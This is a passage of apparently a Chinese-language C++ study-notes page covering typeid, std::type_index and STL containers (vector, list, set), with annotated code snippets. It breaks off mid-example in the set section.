<div class="tabs" id="typeid"><ul class="nav-tabs"><li class="tab active"><a href="#typeid-1">basic</a></li><li class="tab"><a href="#typeid-2">inherit</a></li></ul><div class="tab-content"><div class="tab-pane active" id="typeid-1"><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;typeinfo&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">1</span>;</span><br><span class="line">    <span class="type">float</span> j = <span class="number">1.0</span>;</span><br><span class="line">    <span class="type">char</span> c = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="type">int</span> *pi = &amp;i;</span><br><span class="line">    <span class="type">float</span> *pj = &amp;j;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> type_info&amp; tint = <span class="built_in">typeid</span>(<span class="type">int</span>);</span><br><span class="line">    <span class="type">const</span> type_info&amp; ti = <span class="built_in">typeid</span>(i);</span><br><span class="line">    <span class="type">const</span> type_info&amp; tj = <span class="built_in">typeid</span>(j);</span><br><span class="line">    <span class="type">const</span> type_info&amp; tk = <span class="built_in">typeid</span>(i + j);</span><br><span class="line">    <span class="type">const</span> type_info&amp; tc = <span class="built_in">typeid</span>(c);</span><br><span class="line">    <span class="type">const</span> type_info&amp; tpi = <span class="built_in">typeid</span>(pi);</span><br><span class="line">    <span class="type">const</span> type_info&amp; tpj = <span class="built_in">typeid</span>(pj);</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; tint.<span class="built_in">name</span>() &lt;&lt; endl; <span class="comment">// i</span></span><br><span class="line">    cout &lt;&lt; ti.<span class="built_in">name</span>() &lt;&lt; endl; <span class="comment">// i</span></span><br><span class="line">    cout &lt;&lt; tj.<span class="built_in">name</span>() &lt;&lt; endl; <span class="comment">// f</span></span><br><span class="line">    cout &lt;&lt; tk.<span class="built_in">name</span>() &lt;&lt; endl; <span class="comment">// f</span></span><br><span class="line">    cout &lt;&lt; tc.<span class="built_in">name</span>() &lt;&lt; endl; <span class="comment">// c</span></span><br><span class="line">    cout &lt;&lt; tpi.<span class="built_in">name</span>() &lt;&lt; endl; <span class="comment">// Pi</span></span><br><span class="line">    cout &lt;&lt; tpj.<span class="built_in">name</span>() &lt;&lt; endl; <span class="comment">// Pf</span></span><br><span class="line">    cout &lt;&lt; (ti == tj) &lt;&lt; endl; <span class="comment">// 0</span></span><br><span class="line">    cout &lt;&lt; (tk == tj) &lt;&lt; endl; <span class="comment">// 1</span></span><br><span class="line">    cout &lt;&lt; (tpi == tpj) &lt;&lt; endl; <span class="comment">// 0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="typeid-2"><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;typeinfo&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">A1</span> &#123;&#125;;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">B1</span> : A1 &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">A2</span> &#123; <span class="keyword">virtual</span> ~<span class="built_in">A2</span>() &#123;&#125; &#125;;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">B2</span> : A2 &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    B1 b1;</span><br><span class="line">    A1&amp; a1 = b1;</span><br><span class="line">    A1* pa1 = &amp;a1;</span><br><span class="line"></span><br><span class="line">    B2 b2;</span><br><span class="line">    A2&amp; a2 = b2;</span><br><span class="line">    A2* pa2 = &amp;a2;</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;[non-polymorphic] &quot;</span> &lt;&lt; <span class="built_in">typeid</span>(a1).<span class="built_in">name</span>() <span class="comment">// 2A1</span></span><br><span class="line">              &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; <span class="built_in">typeid</span>(b1).<span class="built_in">name</span>()                  <span class="comment">// 2B1</span></span><br><span class="line">              &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; <span class="built_in">typeid</span>(pa1).<span class="built_in">name</span>()                 <span class="comment">// P2A1</span></span><br><span class="line">              &lt;&lt; <span class="string">&quot;\n[polymorphic] &quot;</span> &lt;&lt; <span class="built_in">typeid</span>(a2).<span class="built_in">name</span>()   <span class="comment">// 2B2</span></span><br><span class="line">              &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; <span class="built_in">typeid</span>(b2).<span class="built_in">name</span>()                  <span class="comment">// 2B2</span></span><br><span class="line">              &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; <span class="built_in">typeid</span>(pa2).<span class="built_in">name</span>()                 <span class="comment">// P2A2 (warning)</span></span><br><span class="line">              &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="type-index-c-11"><a href="#type-index-c-11" class="headerlink" title="type_index (c++11)"></a>type_index (c++11)</h2><p>std::type_index类是对std::type_info对象的包装类，在容器中作为key使用。</p>
<ul>
<li>std::type_index.name()是对std::type_info.name()的包装</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;typeindex&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;typeinfo&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">A</span> &#123;</span><br><span class="line">    <span class="keyword">virtual</span> ~<span class="built_in">A</span>() &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">B</span> : A &#123;&#125;;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">C</span> : A &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::unordered_map&lt;std::type_index, std::string&gt; type_names;</span><br><span class="line"></span><br><span class="line">    type_names[std::<span class="built_in">type_index</span>(<span class="built_in">typeid</span>(<span class="type">int</span>))] = <span class="string">&quot;int&quot;</span>;</span><br><span class="line">    type_names[std::<span class="built_in">type_index</span>(<span class="built_in">typeid</span>(<span class="type">double</span>))] = <span class="string">&quot;double&quot;</span>;</span><br><span class="line">    type_names[std::<span class="built_in">type_index</span>(<span class="built_in">typeid</span>(A))] = <span class="string">&quot;A&quot;</span>;</span><br><span class="line">    type_names[std::<span class="built_in">type_index</span>(<span class="built_in">typeid</span>(B))] = <span class="string">&quot;B&quot;</span>;</span><br><span class="line">    type_names[std::<span class="built_in">type_index</span>(<span class="built_in">typeid</span>(C))] = <span class="string">&quot;C&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">double</span> d;</span><br><span class="line">    A a;</span><br><span class="line">    <span class="function">std::unique_ptr&lt;A&gt; <span class="title">b</span><span class="params">(<span class="keyword">new</span> B)</span></span>;</span><br><span class="line">    <span class="function">std::unique_ptr&lt;A&gt; <span class="title">c</span><span class="params">(<span class="keyword">new</span> C)</span></span>;</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; type_names[std::<span class="built_in">type_index</span>(<span class="built_in">typeid</span>(i))] &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;  <span class="comment">// int</span></span><br><span class="line">    std::cout &lt;&lt; type_names[std::<span class="built_in">type_index</span>(<span class="built_in">typeid</span>(d))] &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;  <span class="comment">// double</span></span><br><span class="line">    std::cout &lt;&lt; type_names[std::<span class="built_in">type_index</span>(<span class="built_in">typeid</span>(a))] &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;  <span class="comment">// A</span></span><br><span class="line">    std::cout &lt;&lt; type_names[std::<span class="built_in">type_index</span>(<span class="built_in">typeid</span>(*b))] &lt;&lt; <span class="string">&#x27;\n&#x27;</span>; <span class="comment">// B</span></span><br><span class="line">    std::cout &lt;&lt; type_names[std::<span class="built_in">type_index</span>(<span class="built_in">typeid</span>(*c))] &lt;&lt; <span class="string">&#x27;\n&#x27;</span>; <span class="comment">// C</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h1><h2 id="vector"><a href="#vector" class="headerlink" title="vector"></a>vector</h2><ul>
<li>动态数组：连续内存（随机访问），动态扩容（不够时翻倍+迁移）</li>
</ul>
<div class="tabs" id="stl-vector"><ul class="nav-tabs"><li class="tab active"><a href="#stl-vector-1">init</a></li><li class="tab"><a href="#stl-vector-2">iterate</a></li><li class="tab"><a href="#stl-vector-3">delete</a></li><li class="tab"><a href="#stl-vector-4">clear</a></li><li class="tab"><a href="#stl-vector-5">&array</a></li><li class="tab"><a href="#stl-vector-6">&set</a></li></ul><div class="tab-content"><div class="tab-pane active" id="stl-vector-1"><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function">std::vector&lt;<span class="type">int</span>&gt; <span class="title">v</span><span class="params">(<span class="number">5</span>)</span></span>;              <span class="comment">// 5 elements (default 0)</span></span><br><span class="line"><span class="function">std::vector&lt;std::string&gt; <span class="title">v</span><span class="params">(<span class="number">5</span>, <span class="string">&quot;a&quot;</span>)</span></span>; <span class="comment">// 5 elements (value &quot;a&quot;)</span></span><br><span class="line">std::vector&lt;std::vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">mv</span>(<span class="number">3</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(<span class="number">3</span>, <span class="number">11</span>)); <span class="comment">// 3x3 matrix(default 11)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Set minimum capacity</span></span><br><span class="line">std::vector&lt;<span class="type">int</span>&gt; v;</span><br><span class="line">v.<span class="built_in">reserve</span>(<span class="number">5</span>);   <span class="comment">// only change capacity</span></span><br><span class="line">v.<span class="built_in">push_back</span>(<span class="number">1</span>); <span class="comment">// add element</span></span><br><span class="line">v.<span class="built_in">resize</span>(<span class="number">5</span>);    <span class="comment">// change capacity and add 5 elements with default value</span></span><br><span class="line">v.<span class="built_in">resize</span>(<span class="number">5</span>, <span class="number">11</span>);<span class="comment">// change capacity and add 5 elements with value 11</span></span><br><span class="line">v[<span class="number">4</span>] = <span class="number">4</span>;       <span class="comment">// modify element</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// From list</span></span><br><span class="line">std::list&lt;std::string&gt; listOfStr;</span><br><span class="line">listOfStr.<span class="built_in">push_back</span>(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">listOfStr.<span class="built_in">push_back</span>(<span class="string">&quot;b&quot;</span>);</span><br><span class="line"><span class="function">std::vector&lt;std::string&gt; <span class="title">v</span><span class="params">(listOfStr.begin(), listOfStr.end())</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// From vector</span></span><br><span class="line">std::vector&lt;std::string&gt; vecOfStr;</span><br><span class="line">vecOfStr.<span class="built_in">push_back</span>(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">vecOfStr.<span class="built_in">push_back</span>(<span class="string">&quot;b&quot;</span>);</span><br><span class="line"><span class="function">std::vector&lt;std::string&gt; <span class="title">v</span><span class="params">(vecOfStr)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// (c++11) initializer list</span></span><br><span class="line">std::vector&lt;<span class="type">int</span>&gt; v&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;;</span><br><span class="line">std::vector&lt;std::vector&lt;<span class="type">int</span>&gt;&gt; mv = &#123;</span><br><span class="line">    &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span> &#125;,</span><br><span class="line">    &#123;<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span> &#125;,</span><br><span class="line">    &#123;<span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span> &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="stl-vector-2"><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// use indexing</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; v.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">    std::cout &lt;&lt; v[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// use indexing (backward direction)</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = v.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">    std::cout &lt;&lt; v[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// use iterators</span></span><br><span class="line"><span class="keyword">for</span> (vector&lt;<span class="type">int</span>&gt;::iterator it = v.<span class="built_in">begin</span>(); it != v.<span class="built_in">end</span>(); it++) &#123;</span><br><span class="line">    std::cout &lt;&lt; *it;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// use iterators (backward direction)</span></span><br><span class="line"><span class="keyword">for</span> (std::vector&lt;<span class="type">int</span>&gt;::reverse_iterator it = v.<span class="built_in">rbegin</span>(); it != v.<span class="built_in">rend</span>(); it++) &#123;</span><br><span class="line">    std::cout &lt;&lt; *it;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// (c++11) use auto</span></span><br><span class="line"><span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span>&amp; element : v) &#123;</span><br><span class="line">    sum = sum + element;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// (c++11) use for_each</span></span><br><span class="line"><span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">for_each(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(), [&amp;sum](<span class="type">const</span> <span class="keyword">auto</span>&amp; element) &#123;</span><br><span class="line">    sum = sum + element;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// (c++11) use for_each (backward direction)</span></span><br><span class="line"><span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">std::for_each(v.<span class="built_in">rbegin</span>(), v.<span class="built_in">rend</span>(), [&amp;sum](<span class="type">const</span> <span class="keyword">auto</span>&amp; element) &#123;</span><br><span class="line">    sum = sum + element;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="stl-vector-3"><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// O(n^2) shift all elements in right by 1 after delete a element</span></span><br><span class="line">std::vector&lt;<span class="type">int</span>&gt;::iterator it = v.<span class="built_in">begin</span>();</span><br><span class="line"><span class="keyword">while</span> (it != v.<span class="built_in">end</span>()) &#123;</span><br><span class="line">    <span class="keyword">if</span> (*it == element) &#123;</span><br><span class="line">        it = v.<span class="built_in">erase</span>(it);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        it++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// O(n) std::remove将不匹配的元素交换到头部，返回第一个匹配元素</span></span><br><span class="line">v.<span class="built_in">erase</span>(std::<span class="built_in">remove</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(), element), v.<span class="built_in">end</span>());</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="stl-vector-4"><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">v.<span class="built_in">clear</span>();             <span class="comment">// 清空元素，不释放内存</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;().<span class="built_in">swap</span>(v); <span class="comment">// 清空元素，且释放内存</span></span><br><span class="line">v.<span class="built_in">shrink_to_fit</span>();     <span class="comment">// 降低容器capacity到size</span></span><br><span class="line">v.<span class="built_in">clear</span>(); v.<span class="built_in">shrink_to_fit</span>(); <span class="comment">// 清空内容，且释放内存</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="stl-vector-5"><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// From array</span></span><br><span class="line">std::string arr[] = &#123;<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;d&quot;</span>&#125;;</span><br><span class="line">v.<span class="built_in">assign</span>(std::<span class="built_in">begin</span>(arr), std::<span class="built_in">end</span>(arr));</span><br><span class="line"><span class="function">std::vector&lt;std::string&gt; <span class="title">v</span><span class="params">(arr, arr + <span class="keyword">sizeof</span>(arr)/<span class="keyword">sizeof</span>(std::string))</span></span>;</span><br><span class="line"><span class="function">std::vector&lt;std::string&gt; <span class="title">v</span><span class="params">(std::begin(arr), std::end(arr))</span></span>;</span><br><span class="line">std::<span class="built_in">copy</span>(std::<span class="built_in">begin</span>(arr), std::<span class="built_in">end</span>(arr), std::<span class="built_in">back_inserter</span>(v));</span><br><span class="line">std::<span class="built_in">transform</span>(std::<span class="built_in">begin</span>(arr), std::<span class="built_in">end</span>(arr), std::<span class="built_in">back_inserter</span>(v), [](<span class="type">const</span> <span class="keyword">auto</span>&amp; element) &#123;</span><br><span class="line">    <span class="keyword">return</span> element + <span class="string">&quot;:&quot;</span>;</span><br><span class="line">&#125;);</span><br><span class="line">for_each(std::<span class="built_in">begin</span>(arr), std::<span class="built_in">end</span>(arr), [&amp;](<span class="keyword">auto</span> element) &#123;</span><br><span class="line">    v.<span class="built_in">push_back</span>(element);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// To array</span></span><br><span class="line">std::<span class="built_in">copy</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(), arr);</span><br><span class="line">std::<span class="built_in">transform</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(), arr, [](<span class="type">const</span> <span class="keyword">auto</span>&amp; element)&#123;</span><br><span class="line">    <span class="keyword">return</span> element;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="stl-vector-6"><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// From set</span></span><br><span class="line">std::set&lt;<span class="type">int</span>&gt; s&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;;</span><br><span class="line">v.<span class="built_in">assign</span>(s.<span class="built_in">begin</span>(), s.<span class="built_in">end</span>());</span><br><span class="line"><span class="function">std::vector&lt;<span class="type">int</span>&gt; <span class="title">v</span><span class="params">(std::begin(s), std::end(s))</span></span>;</span><br><span class="line">std::<span class="built_in">copy</span>(s.<span class="built_in">begin</span>(), s.<span class="built_in">end</span>(), std::<span class="built_in">inserter</span>(v, v.<span class="built_in">begin</span>()));</span><br><span class="line">std::<span class="built_in">transform</span>(s.<span class="built_in">begin</span>(), s.<span class="built_in">end</span>(), std::<span class="built_in">inserter</span>(v, v.<span class="built_in">begin</span>()), [](<span class="type">const</span> <span class="keyword">auto</span>&amp; element) &#123;</span><br><span class="line">    <span class="keyword">return</span> element * <span class="number">2</span>;</span><br><span class="line">&#125;);</span><br><span class="line">for_each(s.<span class="built_in">begin</span>(), s.<span class="built_in">end</span>(), [&amp;](<span class="type">const</span> <span class="keyword">auto</span>&amp; element) &#123;</span><br><span class="line">    v.<span class="built_in">push_back</span>(element);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// To set</span></span><br><span class="line"><span class="function">std::set&lt;<span class="type">int</span>&gt; <span class="title">s</span><span class="params">(v.begin(), v.end())</span></span>;</span><br><span class="line">for_each(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(), [&amp;](<span class="type">const</span> <span class="keyword">auto</span>&amp; element)&#123;</span><br><span class="line">    s.<span class="built_in">insert</span>(element);</span><br><span class="line">&#125;);</span><br><span class="line">std::<span class="built_in">copy</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(), std::<span class="built_in">inserter</span>(s, s.<span class="built_in">end</span>()));</span><br><span class="line">std::<span class="built_in">transform</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(), std::<span class="built_in">inserter</span>(s, s.<span class="built_in">begin</span>()), [](<span class="type">const</span> <span class="keyword">auto</span>&amp; element)&#123;</span><br><span class="line">    <span class="keyword">return</span> element;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">std::<span class="built_in">generate_n</span>(std::<span class="built_in">inserter</span>(s, s.<span class="built_in">begin</span>()), v.<span class="built_in">size</span>(), [&amp;]() &#123;</span><br><span class="line">    <span class="keyword">return</span> v[i++];</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="list"><a href="#list" class="headerlink" title="list"></a>list</h2><ul>
<li>双向链表：随机内存</li>
</ul>
<div class="tabs" id="stl-list"><ul class="nav-tabs"><li class="tab active"><a href="#stl-list-1">init</a></li><li class="tab"><a href="#stl-list-2">index</a></li><li class="tab"><a href="#stl-list-3">delete</a></li></ul><div class="tab-content"><div class="tab-pane active" id="stl-list-1"><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">std::list&lt;<span class="type">int</span>&gt; L;</span><br><span class="line">L.<span class="built_in">push_back</span>(<span class="number">3</span>);</span><br><span class="line">L.<span class="built_in">push_back</span>(<span class="number">4</span>);</span><br><span class="line">L.<span class="built_in">push_front</span>(<span class="number">2</span>);</span><br><span class="line">L.<span class="built_in">push_front</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="function">std::list&lt;<span class="type">int</span>&gt; <span class="title">L</span><span class="params">(<span class="number">5</span>, <span class="number">11</span>)</span></span>; <span class="comment">// 5 elements (value 11)</span></span><br><span class="line"><span class="function">std::list&lt;<span class="type">int</span>&gt; <span class="title">L</span><span class="params">(&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;)</span></span>; <span class="comment">// (c++11) initializer list</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// From array</span></span><br><span class="line"><span class="type">int</span> arr[] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;;</span><br><span class="line"><span class="function">std::list&lt;<span class="type">int</span>&gt; <span class="title">L</span><span class="params">(arr, arr + <span class="keyword">sizeof</span>(arr) / <span class="keyword">sizeof</span>(<span class="type">int</span>))</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// From vector</span></span><br><span class="line"><span class="function">std::list&lt;<span class="type">int</span>&gt; <span class="title">L</span><span class="params">(v.begin(), v.end())</span></span>;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="stl-list-2"><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">std::list&lt;<span class="type">int</span>&gt; <span class="title">L</span><span class="params">(&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// use advance</span></span><br><span class="line">std::list&lt;std::string&gt;::iterator it = L.<span class="built_in">begin</span>();</span><br><span class="line">std::<span class="built_in">advance</span>(it, <span class="number">2</span>); <span class="comment">// (*it) is 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// use next</span></span><br><span class="line"><span class="keyword">auto</span> it = std::<span class="built_in">next</span>(L.<span class="built_in">begin</span>(), <span class="number">2</span>);  <span class="comment">// (*it) is 3</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="stl-list-3"><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;list&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">std::list&lt;<span class="type">int</span>&gt; <span class="title">L</span><span class="params">(&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">4</span>&#125;)</span></span>;</span><br><span class="line">L.<span class="built_in">remove</span>(<span class="number">4</span>); <span class="comment">// Remove all elements with value 4</span></span><br><span class="line">L.<span class="built_in">remove_if</span>([](<span class="type">const</span> <span class="type">int</span>&amp; val) &#123; <span class="comment">// Remove all elements by value in some condition</span></span><br><span class="line">    <span class="built_in">return</span> (val &gt;= <span class="number">2</span> &amp;&amp; val &lt; <span class="number">5</span>) ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// O(n) delete a element</span></span><br><span class="line">std::list&lt;<span class="type">int</span>&gt;::iterator it = L.<span class="built_in">begin</span>();</span><br><span class="line"><span class="keyword">while</span> (it != L.<span class="built_in">end</span>()) &#123;</span><br><span class="line">    <span class="keyword">if</span> (*it == element) &#123;</span><br><span class="line">        it = L.<span class="built_in">erase</span>(it);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        it++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h2><h2 id="queue"><a href="#queue" class="headerlink" title="queue"></a>queue</h2><h2 id="deque"><a href="#deque" class="headerlink" title="deque"></a>deque</h2><h2 id="set"><a href="#set" class="headerlink" title="set"></a>set</h2><ul>
<li>平衡二叉树，元素必须是唯一的，且是已排序的，因此搜索复杂度为log(n)</li>
<li>为了保持二叉树的平衡，不允许修改元素</li>
<li>默认使用<code>operator&lt;</code>比较两个元素，传递外部排序条件后会覆盖默认规则</li>
</ul>
<div class="tabs" id="stl-set"><ul class="nav-tabs"><li class="tab active"><a href="#stl-set-1">sort</a></li><li class="tab"><a href="#stl-set-2">index</a></li><li class="tab"><a href="#stl-set-3">insert</a></li><li class="tab"><a href="#stl-set-4">delete</a></li></ul><div class="tab-content"><div class="tab-pane active" id="stl-set-1"><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Message</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Message</span>(std::string content) : _content(content) &#123;&#125;</span><br><span class="line">    <span class="function">std::string <span class="title">getContent</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> <span class="keyword">this</span>-&gt;_content; &#125;</span><br><span class="line">    <span class="type">bool</span> <span class="keyword">operator</span>&lt; (<span class="type">const</span> Message&amp; msg) <span class="type">const</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">this</span>-&gt;_content &lt; msg._content);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    std::string _content;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MessageComparator</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">operator</span><span class="params">()</span> <span class="params">(<span class="type">const</span> Message&amp; msg1, <span class="type">const</span> Message&amp; msg2)</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> msg1.<span class="built_in">getContent</span>() &gt; msg2.<span class="built_in">getContent</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function">Message <span class="title">msg1</span><span class="params">(<span class="string">&quot;A&quot;</span>)</span></span>;</span><br><span class="line">    <span class="function">Message <span class="title">msg2</span><span class="params">(<span class="string">&quot;B&quot;</span>)</span></span>;</span><br><span class="line">    <span class="function">Message <span class="title">msg3</span><span class="params">(<span class="string">&quot;A&quot;</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">    std::set&lt;Message&gt; sms1;</span><br><span class="line">    sms1.<span class="built_in">insert</span>(msg1);</span><br><span 